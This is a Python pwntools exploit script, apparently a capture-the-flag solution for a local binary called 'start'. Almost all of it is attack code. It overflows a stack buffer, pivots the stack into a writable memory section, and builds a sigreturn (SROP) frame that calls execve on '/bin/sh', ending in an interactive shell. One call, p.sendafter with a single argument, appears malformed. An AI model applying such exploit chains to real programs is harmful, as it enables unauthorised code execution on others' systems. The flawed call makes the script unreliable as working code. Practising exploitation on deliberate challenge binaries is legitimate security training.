#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template start
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('start')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
break *0x401011
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

p = start()
rw_section = 0x00000000403900
payload = b'a' * 1024
payload += p64(rw_section)
payload += p64(0x40103c)
p.sendafter(payload)


syscall = 0x000000000040100f
leave_ret = 0x401065

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = rw_section + 0x400
frame.rip = syscall
frame.rsp = rw_section
payload = b'A'*0x100
payload += flat(
    rw_section - 0x300 + 0x8,
    0x401043,
    syscall,
    bytes(frame)
    )
payload = payload.ljust(0x400, b'P')
payload += flat(
    rw_section - 0x300,
    leave_ret)
p.send(payload)

p.send(b'/bin/sh\x00' + b'\x00'*7)
p.interactive()


